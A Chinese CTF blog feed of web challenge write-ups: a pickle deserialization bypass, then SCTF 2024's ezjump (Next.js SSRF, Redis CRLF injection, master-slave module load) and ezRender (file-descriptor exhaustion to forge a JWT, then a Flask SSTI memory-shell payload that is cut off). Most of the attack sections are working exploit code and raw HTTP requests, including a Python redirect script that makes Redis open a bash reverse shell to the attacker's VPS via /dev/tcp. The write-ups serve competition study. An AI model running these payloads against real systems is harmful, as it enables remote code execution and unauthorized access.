class="hljs-string">&#x27;os.chdir&#x27;</span>, <span class="hljs-string">&#x27;os.fchdir&#x27;</span>, <span class="hljs-string">&#x27;os.chroot&#x27;</span>, <span class="hljs-string">&#x27;os.chmod&#x27;</span>, <span class="hljs-string">&#x27;os.chown&#x27;</span>, <span class="hljs-string">&#x27;os.link&#x27;</span>, <span class="hljs-string">&#x27;os.lchown&#x27;</span>, <span class="hljs-string">&#x27;os.listdir&#x27;</span>,<br>    <span class="hljs-string">&#x27;os.lstat&#x27;</span>, <span class="hljs-string">&#x27;os.mkfifo&#x27;</span>, <span class="hljs-string">&#x27;os.mknod&#x27;</span>, <span class="hljs-string">&#x27;os.access&#x27;</span>, <span class="hljs-string">&#x27;os.mkdir&#x27;</span>, <span class="hljs-string">&#x27;os.makedirs&#x27;</span>, <span class="hljs-string">&#x27;os.readlink&#x27;</span>, <span class="hljs-string">&#x27;os.remove&#x27;</span>,<br>    <span class="hljs-string">&#x27;os.removedirs&#x27;</span>, <span class="hljs-string">&#x27;os.rename&#x27;</span>, <span class="hljs-string">&#x27;os.renames&#x27;</span>, <span class="hljs-string">&#x27;os.rmdir&#x27;</span>, <span class="hljs-string">&#x27;os.tempnam&#x27;</span>, <span class="hljs-string">&#x27;os.tmpnam&#x27;</span>, <span class="hljs-string">&#x27;os.unlink&#x27;</span>, <span class="hljs-string">&#x27;os.walk&#x27;</span>,<br>    <span class="hljs-string">&#x27;os.execl&#x27;</span>, <span class="hljs-string">&#x27;os.execle&#x27;</span>, <span class="hljs-string">&#x27;os.execlp&#x27;</span>, <span class="hljs-string">&#x27;os.execv&#x27;</span>, <span class="hljs-string">&#x27;os.execve&#x27;</span>, <span class="hljs-string">&#x27;os.dup&#x27;</span>, <span class="hljs-string">&#x27;os.dup2&#x27;</span>, <span class="hljs-string">&#x27;os.execvp&#x27;</span>, <span class="hljs-string">&#x27;os.execvpe&#x27;</span>,<br>    <span class="hljs-string">&#x27;os.fork&#x27;</span>, <span class="hljs-string">&#x27;os.forkpty&#x27;</span>, <span class="hljs-string">&#x27;os.kill&#x27;</span>, <span class="hljs-string">&#x27;os.spawnl&#x27;</span>, <span class="hljs-string">&#x27;os.spawnle&#x27;</span>, <span class="hljs-string">&#x27;os.spawnlp&#x27;</span>, <span class="hljs-string">&#x27;os.spawnlpe&#x27;</span>, <span class="hljs-string">&#x27;os.spawnv&#x27;</span>,<br>    <span class="hljs-string">&#x27;os.spawnve&#x27;</span>, <span class="hljs-string">&#x27;os.spawnvp&#x27;</span>, <span class="hljs-string">&#x27;os.spawnvpe&#x27;</span>, <span class="hljs-string">&#x27;pickle.load&#x27;</span>, <span class="hljs-string">&#x27;pickle.loads&#x27;</span>, <span class="hljs-string">&#x27;cPickle.load&#x27;</span>, <span class="hljs-string">&#x27;cPickle.loads&#x27;</span>,<br>    <span class="hljs-string">&#x27;subprocess.call&#x27;</span>, <span class="hljs-string">&#x27;subprocess.check_call&#x27;</span>, <span class="hljs-string">&#x27;subprocess.check_output&#x27;</span>, <span class="hljs-string">&#x27;subprocess.Popen&#x27;</span>,<br>    <span class="hljs-string">&#x27;commands.getstatusoutput&#x27;</span>, <span class="hljs-string">&#x27;commands.getoutput&#x27;</span>, <span class="hljs-string">&#x27;commands.getstatus&#x27;</span>, <span class="hljs-string">&#x27;glob.glob&#x27;</span>,<br>    <span class="hljs-string">&#x27;linecache.getline&#x27;</span>, <span class="hljs-string">&#x27;shutil.copyfileobj&#x27;</span>, <span class="hljs-string">&#x27;shutil.copyfile&#x27;</span>, <span class="hljs-string">&#x27;shutil.copy&#x27;</span>, <span class="hljs-string">&#x27;shutil.copy2&#x27;</span>, <span class="hljs-string">&#x27;shutil.move&#x27;</span>,<br>    <span class="hljs-string">&#x27;shutil.make_archive&#x27;</span>, <span class="hljs-string">&#x27;popen2.popen2&#x27;</span>, <span class="hljs-string">&#x27;popen2.popen3&#x27;</span>, <span class="hljs-string">&#x27;popen2.popen4&#x27;</span>, <span class="hljs-string">&#x27;timeit.timeit&#x27;</span>, <span class="hljs-string">&#x27;sys.call_tracing&#x27;</span>,<br>    <span class="hljs-string">&#x27;code.interact&#x27;</span>, <span class="hljs-string">&#x27;code.compile_command&#x27;</span>, <span class="hljs-string">&#x27;codeop.compile_command&#x27;</span>, <span class="hljs-string">&#x27;pty.spawn&#x27;</span>, <span class="hljs-string">&#x27;posixfile.open&#x27;</span>,<br>    <span class="hljs-string">&#x27;posixfile.fileopen&#x27;</span><br>]<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SafeUnpickler</span>(pickle.Unpickler):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_class</span>(<span class="hljs-params">self, module, name</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;module&#125;</span>.<span class="hljs-subst">&#123;name&#125;</span>&quot;</span> <span class="hljs-keyword">in</span> BLACKLISTED_CLASSES:<br>            <span class="hljs-keyword">raise</span> pickle.UnpicklingError(<span class="hljs-string">&quot;Forbidden class: %s.%s&quot;</span> % (module, name))<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>().find_class(module, name)<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&quot;POST&quot;</span>:<br>        encoded_data = request.form[<span class="hljs-string">&quot;data&quot;</span>]<br>        decoded_data = base64.b64decode(encoded_data)<br>        <br>        <span class="hljs-keyword">try</span>:<br>            data_stream = io.BytesIO(decoded_data)<br>            unpickler = SafeUnpickler(data_stream)<br>            result = unpickler.load()<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Deserialized data: <span class="hljs-subst">&#123;<span class="hljs-built_in">list</span>(result)&#125;</span>&quot;</span><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Error during deserialization: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        &lt;form method=&quot;post&quot;&gt;</span><br><span class="hljs-string">            &lt;label for=&quot;data&quot;&gt;Enter your serialized data:&lt;/label&gt;&lt;br&gt;</span><br><span class="hljs-string">            &lt;textarea id=&quot;data&quot; name=&quot;data&quot;&gt;&lt;/textarea&gt;&lt;br&gt;</span><br><span class="hljs-string">            &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;</span><br><span class="hljs-string">        &lt;/form&gt;</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(port=<span class="hljs-number">8080</span>)<br><br></code></pre></td></tr></table></figure><p>直接开抄吧，我也懒得写了：</p><p><a href="https://xz.aliyun.com/t/14061?u_atoken=9d62d196c00e02f7285bab84cbb8f2c7&u_asig=0a472f9017285482695326969e0055">pickle反序列化漏洞基础知识与绕过简析 - 先知社区 (aliyun.com)</a></p><p><a href="https://dummykitty.github.io/python/2023/06/01/pickle-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4.html#%E5%AF%BB%E6%89%BE%E6%9C%AA%E8%A2%AB%E9%99%90%E5%88%B6%E7%9A%84%E5%88%A9%E7%94%A8%E9%93%BE">Pickle 反序列化绕过 - DumKiy’s blog (dummykitty.github.io)</a></p><p>然后用了一下pker这个工具，也挺好用：</p><p><img src="/2024/10/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%9F%E5%BE%97%E4%BC%9A%E6%89%8B%E6%90%93opcode%E5%90%A7/image-20241010161826331.png" alt="image-20241010161826331"></p><p>开始还挺邪门，我说curl打不通，还猜是不出网…….</p><p>本地调了一下，因为反序列化的是一个数字，但是我打的payload是一个可迭代的对象，所以他就会报错int is not iterable.</p><p>而且后面都是报can’t find attribute module。</p><p>那么其实可以猜测只有第一次能打进去，我开始想不出网，难道还要我打个内存马？新生赛都开始要这么手搓opcode了吗？</p><p>结果是我傻逼了，他这机子没有curl，bash一把梭了，艹。</p><p><img src="/2024/10/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%9F%E5%BE%97%E4%BC%9A%E6%89%8B%E6%90%93opcode%E5%90%A7/image-20241010162045844.png" alt="image-20241010162045844"></p>]]></content>
    
    
    
    <tags>
      
      <tag>娱乐向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SCTF-WEB-Learning</title>
    <link href="/2024/10/05/sctf-web-learning/"/>
    <url>/2024/10/05/sctf-web-learning/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>有点小可惜吧，因为就差两道我们天枢就第一了。</p><p>还是自己能力不够，而且也没能力拿到证书，问心有愧，如果拿到xctf今年离大满贯又进一步吧。</p><p>但由于我们不是第一，所以分站赛还有的打，继续加油吧。</p><p>同时藉此复现一手思路，备战下旬网鼎杯（玛德网鼎杯怎么天枢老怪物全都出山了。。。。哈人）</p><h2 id="ezjump"><a href="#ezjump" class="headerlink" title="ezjump"></a>ezjump</h2><p>基本和学长从头看到尾的一道题，最后redis太搞了，slaveof的时候服务器删号你就打不进去，Octane通宵翻redis文档用CLIENT PAUSE改so文件打的，太超人了。</p><p>我本地docker打的时候，死活注册不上，也不知道什么原因，远程就没问题。</p><p>前面是一个CVE-2024-34351的<code>nextjs</code>漏洞：</p><p><a href="https://blog.csdn.net/Jayjay___/article/details/140319709#:~:text=CVE-2024-1">CVE-2024-34351 漏洞复现-CSDN博客</a></p><p><a href="https://cloud.tencent.com/developer/article/2434587">【网络安全】「漏洞复现」（五）从 NextJS SSRF 漏洞看 Host 头滥用所带来的危害-腾讯云开发者社区-腾讯云 (tencent.com)</a></p><p>而且dockerfile能看到后端网卡，报文直接打SSRF：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/success</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>vps:port<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/x-component<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://192.168.193.141:3000/success<br><span class="hljs-attribute">Next-Action</span><span class="hljs-punctuation">: </span>b421a453a66309ec62a2d2049d51250ee55f10fd<br><span class="hljs-attribute">Next-Router-State-Tree</span><span class="hljs-punctuation">: </span>%5B%22%22%2C%7B%22children%22%3A%5B%22success%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=---------------------------332929687741145380582296740589<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>336<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://vps:port<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0<br><br><span class="language-haskell"><span class="hljs-comment">-----------------------------332929687741145380582296740589</span></span><br><span class="language-haskell"><span class="hljs-type">Content</span>-<span class="hljs-type">Disposition</span>: form-<span class="hljs-class"><span class="hljs-keyword">data</span>; name=&quot;1_$<span class="hljs-type">ACTION_ID_b421a453a66309ec62a2d2049d51250ee55f10fd</span>&quot;</span></span><br><span class="language-haskell"></span><br><span class="language-haskell"></span><br><span class="language-haskell"><span class="hljs-comment">-----------------------------332929687741145380582296740589</span></span><br><span class="language-haskell"><span class="hljs-type">Content</span>-<span class="hljs-type">Disposition</span>: form-<span class="hljs-class"><span class="hljs-keyword">data</span>; name=&quot;0&quot;</span></span><br><span class="language-haskell"></span><br><span class="language-haskell">[<span class="hljs-string">&quot;$K1&quot;</span>]</span><br><span class="language-haskell"><span class="hljs-comment">-----------------------------332929687741145380582296740589--</span></span><br><span class="language-haskell"></span><br></code></pre></td></tr></table></figure><p>vps上起一个重定向服务：[SCTF2024 Web&amp;Misc 复现 | 0pium’s Blog (hack3r0pium.github.io)](<a href="https://hack3r0pium.github.io/hack3r0pium/2024/09/21/SCTF2024-Web&Misc-%E5%A4%8D%E7%8E%B0/index.html#:~:text=Web">https://hack3r0pium.github.io/hack3r0pium/2024/09/21/SCTF2024-Web&amp;Misc-复现/index.html#:~:text=Web</a> ezju)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, Response, redirect<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/play&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>    <span class="hljs-comment"># CORS preflight check</span><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;HEAD&#x27;</span>:<br>        response = Response()<br>        response.headers[<span class="hljs-string">&#x27;Content-Type&#x27;</span>] = <span class="hljs-string">&#x27;text/x-component&#x27;</span><br>        <span class="hljs-keyword">return</span> response<br>    <span class="hljs-comment"># after CORS preflight check</span><br>    <span class="hljs-keyword">elif</span> request.method == <span class="hljs-string">&#x27;GET&#x27;</span>:<br>        ssrfUrl = <span class="hljs-string">&#x27;http://172.11.0.3:5000/&#x27;</span><br>        <span class="hljs-keyword">return</span> redirect(ssrfUrl)<br>    <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">1717</span>, debug=<span class="hljs-literal">True</span>)<br><br></code></pre></td></tr></table></figure><p><img src="/2024/10/05/sctf-web-learning/image-20241005232229481.png" alt="image-20241005232229481"></p><p>waf这里是一个字符串逃逸，也很简单有现成脚本，打下CRLF就可以了。</p><p>然后app.py有个curl，虽然把gopher给ban了，但是大小写可绕，给赵哥整红温了，我们搁这dict:&#x2F;&#x2F;半天。。。。。。</p><p>然后直接打一个主从就ok了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, Response, redirect<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/play&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>    <span class="hljs-comment"># CORS preflight check</span><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;HEAD&#x27;</span>:<br>        response = Response()<br>        response.headers[<span class="hljs-string">&#x27;Content-Type&#x27;</span>] = <span class="hljs-string">&#x27;text/x-component&#x27;</span><br>        <span class="hljs-keyword">return</span> response<br>    <span class="hljs-comment"># after CORS preflight check</span><br>    <span class="hljs-keyword">elif</span> request.method == <span class="hljs-string">&#x27;GET&#x27;</span>:<br>        payload=<span class="hljs-string">&quot;\r\n$3\r\npun\r\n&quot;</span><span class="hljs-comment">#闭合set命令</span><br>        <span class="hljs-comment">#按照下面的命令逐一来</span><br>        payload+=<span class="hljs-string">&quot;config set dir /tmp\r\n&quot;</span><br>        <span class="hljs-comment"># payload+=&quot;config set dbfilename exp.so\r\n&quot;</span><br>        <span class="hljs-comment"># payload+=&quot;slaveof vps 恶意redis的port也就是工具中的port\r\n&quot;</span><br>        <span class="hljs-comment"># payload+=&quot;module load /tmp/exp.so&quot;</span><br>        payload+=<span class="hljs-string">&quot;system.exec &#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/vps/反弹shell的port 0&gt;&amp;1\&quot;&#x27;\r\n&quot;</span><br>        exp=<span class="hljs-string">&quot;admin&quot;</span>*<span class="hljs-built_in">len</span>(payload)+payload<br>        ssrfUrl = <span class="hljs-string">f&#x27;http://172.11.0.3:5000/login?username=<span class="hljs-subst">&#123;quote(exp)&#125;</span>&amp;&amp;password=1&#x27;</span><br>        <span class="hljs-keyword">return</span> redirect(ssrfUrl)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">1717</span>, debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>或者用能直接system.rev的so文件。难绷的是打一次就要改一次文件重新放服务然后重新发包，挺繁琐的。折磨我们半天的掉线问题还真就出在so文件上。</p><p><img src="/2024/10/05/sctf-web-learning/image-20241005232541594.png" alt="image-20241005232541594"></p><h2 id="ezRender"><a href="#ezRender" class="headerlink" title="ezRender"></a>ezRender</h2><p>以前没见过，但是队里赛棍学长见过。</p><p>还真就是打ulimit。</p><p>他生成jwt用到了&#x2F;dev&#x2F;random和时间戳，这里hint给了<strong>ulimit -n &#x3D; 2048</strong></p><p>说人话就是同时允许最大打开2048个文件描述符（文件、套接字等），如果进程到了限制就会报错。</p><p>那么我注册2048个账号后，他这个&#x2F;dev&#x2F;ramdom就会因为这个限制打不开了，所以jwt的密钥就剩下10位的时间戳了。</p><p>借用<a href="https://blog.xmcve.com/2024/10/01/SCTF-2024-Writeup/#title-18">SCTF 2024 Writeup - 星盟安全团队 (xmcve.com)</a></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/register</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>124.220.229.60:8080<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://124.220.229.60:8080/register<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>42<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://124.220.229.60:8080<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0<br><br><span class="language-json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;admin§1§&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;admin123&quot;</span><span class="hljs-punctuation">&#125;</span></span><br></code></pre></td></tr></table></figure><p>发包2048个以上。</p><p>time_string 为admin2060时服务器返回的时间戳</p><p>构造一手token：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<br><br><span class="hljs-comment"># 指定时间字符串</span><br>time_string = <span class="hljs-string">&quot;Sun, 29 Sep 2024 06:03:45 GMT&quot;</span>  <br><br><span class="hljs-comment"># 转换为时间戳</span><br>timestamp = <span class="hljs-built_in">int</span>(time.mktime(time.strptime(time_string, <span class="hljs-string">&quot;%a, %d %b %Y %H:%M:%S %Z&quot;</span>)))<br><br><span class="hljs-comment"># 打印时间戳</span><br><span class="hljs-built_in">print</span>(timestamp) <br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> jwt<br><span class="hljs-keyword">from</span> app <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> User <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generateToken</span>(<span class="hljs-params">user</span>):<br>    secret=&#123;<span class="hljs-string">&quot;name&quot;</span>:user,<span class="hljs-string">&quot;is_admin&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>&#125;<br>    <br>    verify_c=jwt.encode(secret, secret_key, algorithm=<span class="hljs-string">&#x27;HS256&#x27;</span>)<br>    infor=&#123;<span class="hljs-string">&quot;name&quot;</span>:user,<span class="hljs-string">&quot;secret&quot;</span>:verify_c&#125;<br>    token=base64.b64encode(json.dumps(infor).encode()).decode()<br>    <span class="hljs-built_in">print</span>(infor)<br>    <span class="hljs-built_in">print</span>(token)<br><br><br>secret_key=<span class="hljs-string">&quot;1727589825&quot;</span><br>generateToken(<span class="hljs-string">&#x27;admin2060&#x27;</span>)<br></code></pre></td></tr></table></figure><p>然后换掉cookie，删除部分用户使存在用户少于2048个，服务正常。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/removeUser</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>1.95.40.5:29351<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Token=eyJuYW1lIjogImFkbWluMjA2MCIsICJzZWNyZXQiOiAiZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SnVZVzFsSWpvaVlXUnRhVzR5TURZd0lpd2lhWE5mWVdSdGFXNGlPaUl4SW4wLi1maGFqQ1M4S1RfMDY2YWlxSmhqNGxHcHdVdWRMbFprMnh1SlFxUld2Q0kifQ==<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://124.220.229.60:8080/register<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>15<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://124.220.229.60:8080<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0<br><br><span class="language-abnf"><span class="hljs-attribute">username</span><span class="hljs-operator">=</span>admin§<span class="hljs-number">1</span>§</span><br></code></pre></td></tr></table></figure><p>code传参直接打入flask内存马：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/admin</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>1.95.40.5:29351<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://124.220.229.60:8080/register<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Token=eyJuYW1lIjogImFkbWluMjA2MCIsICJzZWNyZXQiOiAiZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SnVZVzFsSWpvaVlXUnRhVzR5TURZd0lpd2lhWE5mWVdSdGFXNGlPaUl4SW4wLi1maGFqQ1M4S1RfMDY2YWlxSmhqNGxHcHdVdWRMbFprMnh1SlFxUld2Q0kifQ==<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>323<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://124.220.229.60:8080<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0<br><br><span class="language-handlebars"><span class="language-xml">code=</span><span class="hljs-template-variable">&#123;&#123;(<span class="hljs-name">g.pop.__globals__.__builtins__.__getitem__</span>(<span class="hljs-name">&#x27;EXEC&#x27;.lower</span>()))(<span 